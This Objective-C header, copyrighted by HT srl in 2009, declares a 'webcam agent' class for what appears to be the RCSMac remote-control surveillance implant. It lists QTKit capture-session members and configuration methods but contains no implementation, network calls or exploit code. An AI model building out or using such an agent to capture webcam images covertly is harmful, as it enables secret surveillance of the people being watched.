/*
 * RCSMac - Webcam agent
 * 
 * Created by Massimo Chiodini on 05/08/2009
 *  Refactored by Alfredo Pesoli on 16/09/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <QTKit/QTKit.h>

#import "RCSMLogManager.h"


@interface RCSMAgentWebcam : NSObject <Agents> 
{
@private
  BOOL                              mImageGrabbed;
  QTCaptureDevice                   *mDevice; 
  QTCaptureSession                  *mCaptureSession;
  QTCaptureDeviceInput              *mCaptureDeviceInput;
  QTCaptureDecompressedVideoOutput  *mCaptureDecompressedVideoOutput;
  CVImageBufferRef                  mCurrentImageBuffer;  
  NSMutableDictionary               *mAgentConfiguration;
  
}

+ (RCSMAgentWebcam *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (id)init;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;

@end
